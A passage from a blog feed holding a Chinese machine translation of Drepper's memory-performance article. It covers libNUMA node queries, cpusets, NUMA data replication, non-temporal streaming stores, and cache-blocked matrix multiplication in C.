class="hljs-string">&lt;libNUMA.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">NUMA_mem_get_node_idx</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">NUMA_mem_get_node_mask</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr,</span><br><span class="hljs-params">                            <span class="hljs-type">size_t</span> size,</span><br><span class="hljs-params">                            <span class="hljs-type">size_t</span> __destsize,</span><br><span class="hljs-params">                            <span class="hljs-type">memnode_set_t</span> *dest)</span>;<br></code></pre></td></tr></table></figure><p><code>NUMA_mem_get_node_mask</code> 在 <code>dest</code> 中设置位，以表示根据管理策略，范围 <code>[ addr, addr + size)</code> 中的页面分配在（或将分配在）的所有内存节点。<code>NUMA_mem_get_node</code> 仅查看地址 <code>addr</code> 并返回此地址分配在（或将分配在）的内存节点的索引。这些接口比 <code>get_mempolicy</code> 更易于使用，可能应该被优先选择。</p><p>线程当前使用的 CPU 可以使用 <code>sched_getcpu</code> 查询（见第 6.4.3 节）。使用这些信息，程序可以确定对 CPU 本地的内存节点（s），使用 libNUMA 中的 <code>NUMA_cpu_to_memnode</code> 接口：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;libNUMA.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">NUMA_cpu_to_memnode</span><span class="hljs-params">(<span class="hljs-type">size_t</span> cpusetsize,</span><br><span class="hljs-params">                         <span class="hljs-type">const</span> <span class="hljs-type">cpu_set_t</span> *cpuset,</span><br><span class="hljs-params">                         <span class="hljs-type">size_t</span> memnodesize,</span><br><span class="hljs-params">                         <span class="hljs-type">memnode_set_t</span> *</span><br><span class="hljs-params">                         memnodeset)</span>;<br></code></pre></td></tr></table></figure><p>对这个函数的调用将在指向第四个参数的内存节点集对象中设置所有位，以对应于任何在指向第二个参数的 CPU 集合中本地的内存节点。就像 CPU 信息本身一样，这些信息只有在机器配置发生变化时才是正确的（例如，CPU 被移除和添加）。</p><p><code>memnode_set_t</code> 对象中的位可以在调用底层函数（如 <code>get_mempolicy</code>）时使用。使用 libNUMA 中的其他函数更方便。反向映射可通过以下方式获得：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;libNUMA.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">NUMA_memnode_to_cpu</span><span class="hljs-params">(<span class="hljs-type">size_t</span> memnodesize,</span><br><span class="hljs-params">                         <span class="hljs-type">const</span> <span class="hljs-type">memnode_set_t</span> *</span><br><span class="hljs-params">                         memnodeset,</span><br><span class="hljs-params">                         <span class="hljs-type">size_t</span> cpusetsize,</span><br><span class="hljs-params">                         <span class="hljs-type">cpu_set_t</span> *cpuset)</span>;<br></code></pre></td></tr></table></figure><p>结果 <code>cpuset</code> 中设置的位是本地于 <code>memnodeset</code> 中相应位设置的任何内存节点的 CPU。对于这两个接口，程序员必须意识到这些信息会随着时间的推移而变化（特别是 CPU 热插拔）。在许多情况下，输入位集只有一个位被设置，但是，例如，将 <code>sched_getaffinity</code> 调用检索到的整个 CPU 集合传递给 <code>NUMA_cpu_to_memnode</code> 以确定线程可以直接访问哪些内存节点，也是有意义的。</p><h4 id="6-5-6-CPU-和节点集"><a href="#6-5-6-CPU-和节点集" class="headerlink" title="6.5.6 CPU 和节点集"></a>6.5.6 CPU 和节点集</h4><p>通过改变代码以使用迄今为止描述的接口来调整 SMP 和 NUMA 环境可能非常昂贵（或不可能），如果源代码不可用。此外，系统管理员可能想要对用户和&#x2F;或进程可以使用的资源施加限制。对于这些情况，Linux 内核支持所谓的 CPU 集。这个名字有点误导，因为它们也涵盖了内存节点。它们也与 <code>cpu_set_t</code> 数据类型无关。</p><p>CPU 集的接口目前是特殊的文件系统。它通常不挂载（至少到目前为止）。这可以通过以下命令更改：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mount -t cpuset none /dev/cpuset<br></code></pre></td></tr></table></figure><p>当然，挂载点 <code>/dev/cpuset</code> 必须存在。这个目录的内容是默认（根）CPU 集的描述。它最初包括所有 CPU 和所有内存节点。该目录中的 <code>cpus</code> 文件显示了 CPU 集中的 CPU，<code>mems</code> 文件显示了内存节点，<code>tasks</code> 文件显示了进程。</p><p>要创建一个新的 CPU 集，只需在层次结构中的任何位置创建一个新目录。新的 CPU 集将从父级继承所有设置。然后，可以通过向新目录中的 <code>cpus</code> 和 <code>mems</code> 伪文件中写入新值来更改新 CPU 集的 CPU 和内存节点。</p><p>如果一个进程属于一个 CPU 集，那么该进程的 CPU 和内存节点的设置将用作亲缘性和内存策略位掩码的掩码。这意味着程序不能选择任何不在进程使用的 CPU 集的 <code>cpus</code> 文件中的 CPU（即，在 <code>tasks</code> 文件中列出的 CPU）。对于内存策略的节点掩码和 <code>mems</code> 文件也是如此。</p><p>程序不会遇到任何错误，除非掩码之后掩码为空，因此 CPU 集是控制程序执行的几乎不可见的手段。这种方法在具有许多 CPU 和&#x2F;或内存节点的大型机器上特别有效。将进程移动到新的 CPU 集就像将进程 ID 写入适当 CPU 集的 <code>tasks</code> 文件一样简单。</p><p>CPU 集的目录包含许多其他文件，可以用来指定内存压力下的行为和对 CPU 和内存节点的独占访问等细节。感兴趣的读者可以参考内核源代码树中的 <code>Documentation/cpusets.txt</code> 文件。</p><h4 id="6-5-7-明确的-NUMA-优化"><a href="#6-5-7-明确的-NUMA-优化" class="headerlink" title="6.5.7 明确的 NUMA 优化"></a>6.5.7 明确的 NUMA 优化</h4><p>所有的本地内存和亲缘性规则都不能帮助，如果所有线程在所有节点上都需要访问相同的内存区域。当然，可以通过简单地将线程数量限制为直接连接到内存节点的处理器支持的数量来解决问题。然而，这并不利用 SMP NUMA 机器的优势，因此不是一个真正的选择。</p><p>如果所讨论的数据是只读的，那么有一个简单的解决方案：复制。每个节点可以获取数据的自己的副本，这样就不需要节点间的访问。执行此操作的代码可能如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">local_data</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>   <span class="hljs-type">static</span> <span class="hljs-type">void</span> *data[NNODES];<br>   <span class="hljs-type">int</span> node =<br>     NUMA_memnode_self_current_idx();<br>   <span class="hljs-keyword">if</span> (node == <span class="hljs-number">-1</span>)<br>     <span class="hljs-comment">/* Cannot get node, pick one.  */</span><br>     node = <span class="hljs-number">0</span>;<br>   <span class="hljs-keyword">if</span> (data[node] == <span class="hljs-literal">NULL</span>)<br>     data[node] = allocate_data();<br>   <span class="hljs-keyword">return</span> data[node];<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">worker</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>   <span class="hljs-type">void</span> *data = local_data();<br>   <span class="hljs-keyword">for</span> (...) &#123;<br>     compute using data<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这个代码中，<code>worker</code> 函数通过调用 <code>local_data</code> 获取数据的本地副本的指针。然后它继续循环，使用这个指针。<code>local_data</code> 函数保留了一个已经分配的数据副本的列表。每个系统有有限数量的内存节点，因此指向每个节点内存副本的指针数组的大小是有限的。<code>NUMA_memnode_system_count</code> 函数从 libNUMA 返回这个数字。如果当前节点的指针，由 <code>NUMA_memnode_self_current_idx</code> 调用确定，尚未知道，则分配一个新的副本。</p><p>重要的是要意识到，如果线程在 <code>sched_getcpu</code> 系统调用后被调度到连接到不同内存节点的另一个 CPU 上，并不会发生可怕的事情。这只意味着 <code>worker</code> 中使用 <code>data</code> 变量的访问将访问另一个内存节点上的内存。这会减慢程序的速度，直到 <code>data</code> 被重新计算，但仅此而已。内核将始终避免无故重新平衡每个 CPU 的运行队列。如果发生这样的转移，通常是有充分理由的，并且不会在不久的将来再次发生。</p><p>当涉及到的内存区域是可写的时，情况会更加复杂。在这种情况下，简单的复制将不起作用。根据具体情况，可能有一些可能的解决方案。</p><p>例如，如果可写内存区域用于累积结果，可能有可能首先为每个内存节点创建一个单独的区域以累积结果。然后，当这项工作完成时，将所有每个节点的内存区域合并以获得总结果。即使工作从未真正停止，但需要中间结果，这种技术也可以工作。这种方法的要求是，累积结果的操作是无状态的，即，它不依赖于之前收集的结果。</p><p>然而，直接访问可写内存区域总是更好的。如果对内存区域的访问次数很大，可能有必要强制内核将涉及的内存页面迁移到本地节点。如果访问次数非常高，并且不同节点上的写入没有同时发生，这可能会有所帮助。但请注意，内核不能创造奇迹：页面迁移是复制操作，因此并不便宜。这个成本必须摊销。</p><h4 id="6-5-8-利用所有带宽"><a href="#6-5-8-利用所有带宽" class="headerlink" title="6.5.8 利用所有带宽"></a>6.5.8 利用所有带宽</h4><p>图 5.4 中的数字显示，当缓存无效时，对远程内存的访问并不比对本地内存的访问明显变慢。这意味着程序可能通过将不必再次读取的数据写入连接到另一个处理器的内存中，从而节省本地内存的带宽。连接到 DRAM 模块的带宽和互连的带宽大多是独立的，因此并行使用可以提高整体性能。</p><p>是否真的可能取决于许多因素。一个人必须非常确定缓存是无效的，因为否则与远程访问相关的减速是可测量的。另一个大问题是远程节点是否对自己的内存带宽有需求。在采取这种方法之前，必须详细检查这种可能性。理论上，利用处理器可用的所有带宽可能会产生积极的效果。10h 系列 Opteron 处理器可以直接连接到多达四个其他处理器。利用所有这些额外的带宽，可能结合适当的预取（特别是 <code>prefetchw</code>）可以带来改进，如果系统的其余部分配合的话。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://lwn.net/Articles/256433/">原文</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>内存</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>每个程序员都应该了解的内存知识-Part5</title>
    <link href="/2024/04/29/%E6%AF%8F%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E9%83%BD%E5%BA%94%E8%AF%A5%E4%BA%86%E8%A7%A3%E7%9A%84%E5%86%85%E5%AD%98%E7%9F%A5%E8%AF%86-Part5/"/>
    <url>/2024/04/29/%E6%AF%8F%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%91%98%E9%83%BD%E5%BA%94%E8%AF%A5%E4%BA%86%E8%A7%A3%E7%9A%84%E5%86%85%E5%AD%98%E7%9F%A5%E8%AF%86-Part5/</url>
    
    <content type="html"><![CDATA[<p>程序员可以干什么——缓存优化</p><span id="more"></span><p><strong>注：本文使用 <code>Kimi AI</code> 进行翻译</strong></p><h2 id="6-程序员可以做什么"><a href="#6-程序员可以做什么" class="headerlink" title="6 程序员可以做什么"></a>6 程序员可以做什么</h2><p>在前面部分的描述之后，显然程序员有很多机会影响程序的性能，无论是正面还是负面。这仅针对内存相关操作。我们将从底层开始，从物理RAM访问和L1缓存开始，一直到影响内存处理的操作系统功能。</p><h3 id="6-1-绕过缓存"><a href="#6-1-绕过缓存" class="headerlink" title="6.1 绕过缓存"></a>6.1 绕过缓存</h3><p>当数据被产生并没有立即被再次使用时，内存存储操作首先读取整个缓存行，然后修改缓存数据的事实对性能是不利的。这个操作会将可能很快再次需要的数据推出缓存，以便于那些不久将不会被使用的数据。这特别是对于大型数据结构，如矩阵，它们被填充后稍后使用。在矩阵的最后一个元素被填充之前，其庞大的大小就会将第一个元素挤出，使缓存写入无效。</p><p>对于这种情况，处理器提供了对非临时写操作的支持。在这里，非临时意味着数据将不会被很快重用，因此没有必要缓存它。这些非临时写操作不会读取缓存行然后修改它；相反，新内容直接写入内存。</p><p>这听起来可能很昂贵，但并不一定如此。处理器将尝试使用写入合并（见第3.3.3节）来填充整个缓存行。如果成功，则根本不需要执行内存读取操作。对于x86和x86-64架构，gcc提供了一些内建函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;emmintrin.h&gt;</span></span><br><span class="hljs-type">void</span> _mm_stream_si32(<span class="hljs-type">int</span> *p, <span class="hljs-type">int</span> a);<br><span class="hljs-type">void</span> _mm_stream_si128(<span class="hljs-type">int</span> *p, __m128i a);<br><span class="hljs-type">void</span> _mm_stream_pd(<span class="hljs-type">double</span> *p, __m128d a);<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;xmmintrin.h&gt;</span></span><br><span class="hljs-type">void</span> _mm_stream_pi(__m64 *p, __m64 a);<br><span class="hljs-type">void</span> _mm_stream_ps(<span class="hljs-type">float</span> *p, __m128 a);<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ammintrin.h&gt;</span></span><br><span class="hljs-type">void</span> _mm_stream_sd(<span class="hljs-type">double</span> *p, __m128d a);<br><span class="hljs-type">void</span> _mm_stream_ss(<span class="hljs-type">float</span> *p, __m128 a);<br></code></pre></td></tr></table></figure><p>这些指令最有效地用于一次性处理大量数据。数据从内存加载，在一个或多个步骤中处理，然后重新写回内存。数据“流”通过处理器，因此得名内建函数。</p><p>内存地址必须分别对齐到8或16字节。在使用多媒体扩展的代码中，可以将正常的 <code>_mm_store_*</code> 内建函数替换为这些非临时版本。在第9.1节中的矩阵乘法代码中，我们没有这样做，因为写入的值很快就会被重用。这是一个使用流指令并不有用的示例。关于这段代码的更多内容将在6.2.1节中讨论。</p><p>处理器的写入合并缓冲区只能暂时存储对单个缓存行的部分写入请求。通常有必要将修改单个缓存行的所有指令一个接一个地连续发出，以便写入合并实际上可以发生。下面是一个如何做到这一点的示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;emmintrin.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">setbytes</span><span class="hljs-params">(<span class="hljs-type">char</span> *p, <span class="hljs-type">int</span> c)</span><br>&#123;<br>   __m128i i = _mm_set_epi8(c, c, c, c,<br>                            c, c, c, c,<br>                            c, c, c, c,<br>                            c, c, c, c);<br>   _mm_stream_si128((__m128i *)&amp;p[<span class="hljs-number">0</span>], i);<br>   _mm_stream_si128((__m128i *)&amp;p[<span class="hljs-number">16</span>], i);<br>   _mm_stream_si128((__m128i *)&amp;p[<span class="hljs-number">32</span>], i);<br>   _mm_stream_si128((__m128i *)&amp;p[<span class="hljs-number">48</span>], i);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>假设指针 <code>p</code> 适当对齐，调用此函数将把地址的缓存行中的所有字节设置为 <code>c</code>。写入合并逻辑将看到四个生成的 <code>movntdq</code> 指令，并且只有在执行最后一个指令后才发出写入命令。总之，这个代码序列不仅避免了在写入之前读取缓存行，还避免了用可能不久后不需要的数据污染缓存。在某些情况下，这可以带来巨大的好处。使用此技术的常见代码示例是 C 运行时中的 <code>memset</code> 函数，对于大块，应该使用类似上述的代码序列。</p><p>一些架构提供了专门的解决方案。PowerPC 架构定义了 <code>dcbz</code> 指令，可以用来清除整个缓存行。该指令并不真正绕过缓存，因为为结果分配了一个缓存行，但不会从内存中读取数据。与非临时存储指令相比，它的限制更多，因为缓存行只能设置为全零，并且如果数据不是临时的，它会污染缓存，但不需要写入合并逻辑就可以实现结果。</p><p>为了看到非临时指令的实际效果，我们将看一个新的测试，用于测量写入矩阵的时间，矩阵组织为二维数组。编译器将矩阵在内存中布局，使得最左边的（第一个）索引寻址行为，所有元素在内存中顺序排列。右边的（第二个）索引寻址行中的元素。测试程序以两种方式迭代矩阵：首先在内部循环中增加列号，然后增加行索引。这意味着我们得到了图 6.1 所示的行为。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404291922564.png"></p><blockquote><p><strong>图 6.1：矩阵访问模式</strong></p></blockquote><p>我们测量初始化一个 3000×3000 矩阵所需的时间。为了了解内存的行为，我们使用不使用缓存的存储指令。在 IA-32 处理器上，使用“非临时提示”进行此操作。为了比较，我们还测量了普通的存储操作。结果可以在表 6.1 中看到。</p><blockquote><table><thead><tr><th></th><th>内部循环增量</th></tr></thead><tbody><tr><td>正常</td><td>0.048s</td></tr><tr><td>非临时</td><td>0.048s</td></tr><tr><td><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404291922187.png"></td><td></td></tr><tr><td><strong>表 6.1：定时矩阵初始化</strong></td><td></td></tr></tbody></table></blockquote><p>对于使用缓存的正常写入，我们看到预期的结果：如果内存被顺序使用，我们得到了更好的结果，整个操作大约为 0.048s，转换为大约 750MB&#x2F;s，与更或多或少随机访问所需的 0.127s（大约 280MB&#x2F;s）相比。矩阵足够大，以至于缓存基本上无效。</p><p>我们在这里主要感兴趣的是绕过缓存的写入。它可能令人惊讶的是，顺序访问在这里和使用缓存的情况一样快。这种行为的原因是处理器执行了如上所述的写入合并。此外，非临时写入的内存排序规则是放宽的：程序需要显式地插入内存屏障（对于 x86 和 x86-64 处理器是 <code>sfence</code> 指令）。这意味着处理器有更多的自由度来写回数据，从而尽可能好地使用可用的带宽。</p><p>在内部循环中按列访问的情况下，情况是不同的。结果明显比缓存访问（0.16s，大约 225MB&#x2F;s）慢。在这里，我们可以看到没有写入合并的可能性，每个内存单元格都必须单独寻址。这就需要不断地选择 RAM 芯片中的新行，以及所有相关的延迟。结果是比缓存运行结果差 25%。</p><p>在读取方面，直到最近，处理器除了使用非临时访问（NTA）预取指令的弱提示外，缺乏支持。对于读取，没有与写入合并等效的操作，这对于无法缓存的内存（如内存映射 I&#x2F;O）尤其不利。英特尔在 SSE4.1 扩展中引入了 NTA 加载。它们使用少量的流式加载缓冲区实现；每个缓冲区包含一个缓存行。给定缓存行的第一个 <code>movntdqa</code> 指令将一个缓存行加载到缓冲区中，可能会替换另一个缓存行。对同一缓存行的后续 16 字节对齐访问将以极小的代价由加载缓冲区提供服务。除非有其他原因这样做，否则缓存行不会被加载到缓存中，从而使得在不污染缓存的情况下加载大量内存成为可能。编译器为此指令提供了一个内建函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;smmintrin.h&gt;</span></span><br>__m128i _mm_stream_load_si128 (__m128i *p);<br></code></pre></td></tr></table></figure><p>这个内建函数应该多次使用，将 16 字节块的地址作为参数传递，直到每个缓存行被读取。只有在那时才应该开始下一个缓存行。由于有几个流式读取缓冲区，可能可以同时从两个内存位置读取。</p><p>我们应该从这个实验中得到的是，现代 CPU 非常好地优化了未缓存的写入和（更近期的）读取访问，只要它们是顺序的。只要它们是顺序的，这些知识可以在处理只使用一次的大型数据结构时非常有用。第二，缓存可以帮助掩盖一些——但不是全部——随机内存访问的成本。在这个例子中，由于 RAM 访问的实现，随机访问要慢 70%。在实现方式改变之前，应该尽可能避免随机访问。</p><p>在关于预取的一节中，我们将再次看到非临时标志。</p><h3 id="6-2-缓存访问"><a href="#6-2-缓存访问" class="headerlink" title="6.2 缓存访问"></a>6.2 缓存访问</h3><p>程序员可以对缓存做出的最重要的改进是那些影响第1级缓存的。我们将首先讨论它，然后再包括其他级别。显然，对第1级缓存的所有优化也影响其他缓存。所有内存访问的主题都是一样的：提高局部性（空间和时间）并对齐代码和数据。</p><h4 id="6-2-1-优化第1级数据缓存访问"><a href="#6-2-1-优化第1级数据缓存访问" class="headerlink" title="6.2.1 优化第1级数据缓存访问"></a>6.2.1 优化第1级数据缓存访问</h4><p>在第3.3节中，我们已经看到了有效使用 L1d 缓存可以如何提高性能。在本节中，我们将展示哪些类型的代码更改可以帮助提高该性能。继续上一节，我们首先专注于优化顺序访问内存。正如第3.3节的数字所示，当内存被顺序访问时，处理器会自动预取数据。</p><p>使用的示例代码是矩阵乘法。我们使用两个 1000×1000 的 <code>double</code> 元素的正方形矩阵。对于那些忘记了数学的人来说，给定两个矩阵 A 和 B，其元素 aij 和 bij，其中 0 ≤ i,j &lt; N，乘积是：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404291923058.png"></p><p>一个简单的 C 实现如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N; ++i)<br>  <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; N; ++j)<br>    <span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; N; ++k)<br>      res[i][j] += mul1[i][k] * mul2[k][j];<br></code></pre></td></tr></table></figure><p>两个输入矩阵是 <code>mul1</code> 和 <code>mul2</code>。假定结果矩阵 <code>res</code> 已初始化为全零。这是一个很好且简单的实现。但是，显然我们有刚刚在图 6.1 中解释的问题。虽然 <code>mul1</code> 被顺序访问，但内循环提高了 <code>mul2</code> 的行号。这意味着 <code>mul1</code> 被处理得像图 6.1 中的左矩阵，而 <code>mul2</code> 被处理得像右矩阵。这可不好。</p><p>有一种可能的补救措施可以很容易尝试。由于矩阵中的每个元素都被多次访问，因此可能值得在之前重新排列（用数学术语来说就是“转置”）第二个矩阵 <code>mul2</code>。</p><p>转置后（通常用上标“T”表示），我们现在顺序迭代两个矩阵。就 C 代码而言，现在看起来像这样：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">double</span> tmp[N][N];<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N; ++i)<br>  <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; N; ++j)<br>    tmp[i][j] = mul2[j][i];<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N; ++i)<br>  <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; N; ++j)<br>    <span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; N; ++k)<br>      res[i][j] += mul1[i][k] * tmp[j][k];<br></code></pre></td></tr></table></figure><p>我们创建了一个临时变量来包含转置矩阵。这需要触摸更多的内存，但这个成本，希望，可以通过以下方式收回：每列的 1000 个非顺序访问更昂贵（至少在现代硬件上）。是时候进行一些性能测试了。在 Intel Core 2 2666MHz 时钟速度上的结果是（以时钟周期为单位）：</p><blockquote><table><thead><tr><th></th><th>原始</th><th>转置</th></tr></thead><tbody><tr><td>周期</td><td>16,765,297,870</td><td>3,922,373,010</td></tr><tr><td>相对</td><td>100%</td><td>23.4%</td></tr><tr><td><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404291923005.png"></td><td></td><td></td></tr></tbody></table></blockquote><p>通过简单的矩阵转换，我们可以实现 76.6% 的加速！复制操作是值得的。1000 个非顺序访问真的很伤。下一个问题是，这是否是我们能做的最好。我们当然需要一个不需要额外复制的替代方法。我们并不总是有奢侈去执行复制：矩阵可能太大，或者可用内存太小。</p><p>寻找替代实现的搜索应该从仔细检查原始实现所涉及的数学和执行的操作开始。简单的数学知识使我们能够看到，只要每个加数恰好出现一次，每个结果矩阵元素的加法执行的顺序是无关紧要的。{这里我们忽略了可能改变溢出、下溢或舍入发生次数的算术效应。} 这种理解使我们能够寻找重新排序原始代码内循环中执行的加法的解决方案。</p><p>现在让我们检查一下执行原始代码时 <code>mul2</code> 元素访问的实际问题。<code>mul2</code> 的元素访问顺序是：(0,0)，(1,0)，…，(N-1,0)，(0,1)，(1,1)，….。元素 (0,0) 和 (0,1) 在同一个缓存行中，但是，当内循环完成一轮时，这个缓存行早已被逐出。对于这个例子，内循环的每一轮都需要，对于这三个矩阵中的每一个，1000 个缓存行（对于 Core 2 处理器是 64 字节）。这加起来远远超过了 32k 的 L1d 可用。</p><p>但如果我们在执行内循环时同时处理中间循环的两个迭代呢？在这种情况下，我们使用缓存行中保证在 L1d 中的两个 <code>double</code> 值。我们将 L1d 未命中率减半。这当然是一个改进，但是，根据缓存行大小，它可能仍然不是我们能够实现的最好结果。Core 2 处理器的 L1d 缓存行大小为 64 字节。这个实际值可以使用以下代码在运行时查询：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sysconf (_SC_LEVEL1_DCACHE_LINESIZE)<br></code></pre></td></tr></table></figure><p>或者使用命令行工具 <code>getconf</code>，以便程序可以为特定的缓存行大小编译。由于 <code>sizeof(double)</code> 是 8，这意味着要充分利用缓存行，我们应该将中间循环展开 8 次。继续这个思路，为了有效地使用 <code>res</code> 矩阵，即同时写入 8 个结果，我们应该也将外循环展开 8 次。我们假设这里缓存行大小为 64，但代码在系统上也有 32 字节缓存行大小时运行良好，因为两个缓存行也得到了 100% 的利用。一般来说，最好在编译时使用 <code>getconf</code> 实用程序硬编码缓存行大小，如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -DCLS=$(getconf LEVEL1_DCACHE_LINESIZE) ...<br></code></pre></td></tr></table></figure><p>如果二进制文件应该通用，应该使用最大的缓存行大小。对于非常小的 L1ds，这可能意味着不是所有的数据都适合缓存，但这样的处理器不适合高性能程序。我们得到的代码看起来像这样：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SM (CLS / sizeof (double))</span><br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N; i += SM)<br>    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; N; j += SM)<br>        <span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; N; k += SM)<br>            <span class="hljs-keyword">for</span> (i2 = <span class="hljs-number">0</span>, rres = &amp;res[i][j],<br>                     rmul1 = &amp;mul1[i][k]; i2 &lt; SM;<br>                     ++i2, rres += N, rmul1 += N)<br>                <span class="hljs-keyword">for</span> (k2 = <span class="hljs-number">0</span>, rmul2 = &amp;mul2[k][j];<br>                     k2 &lt; SM; ++k2, rmul2 += N)<br>                    <span class="hljs-keyword">for</span> (j2 = <span class="hljs-number">0</span>; j2 &lt; SM; ++j2)<br>                        rres[j2] += rmul1[k2] * rmul2[j2];<br></code></pre></td></tr></table></figure><p>这看起来相当可怕。在某种程度上，它之所以可怕，是因为它包含了一些技巧。最明显的变化是我们现在有六个嵌套循环。外循环以 <code>SM</code>（缓存行大小除以 <code>sizeof(double)</code>）的间隔迭代。这将乘法分成几个可以具有更多缓存局部性的小问题。内部循环遍历外循环的缺失索引。再次，有三个循环。唯一的棘手部分是 <code>k2</code> 和 <code>j2</code> 循环的顺序不同。这是因为在实际计算中，只有一个表达式依赖于 <code>k2</code>，但有两个依赖于 <code>j2</code>。</p><p>这里的其余复杂性来自于 gcc 在优化数组索引方面并不是很聪明。引入额外的变量 <code>rres</code>、<code>rmul1</code> 和 <code>rmul2</code> 通过尽可能地将公共表达式从内部循环中提取出来来优化代码。C 和 C++ 语言的默认别名规则并不帮助编译器做出这些决定（除非使用 <code>restrict</code>，所有指针访问都是潜在的别名来源）。这就是为什么 Fortran 仍然是数值编程的首选语言：它使编写快速代码更容易。{理论上，1999 年修订版中引入到 C 语言中的 <code>restrict</code> 关键字应该解决这个问题。编译器还没有赶上，尽管。主要原因是存在太多错误的代码，这将误导编译器并导致它生成错误的目标代码。}</p><p>我们所有的工作都得到了回报，可以在表 6.2 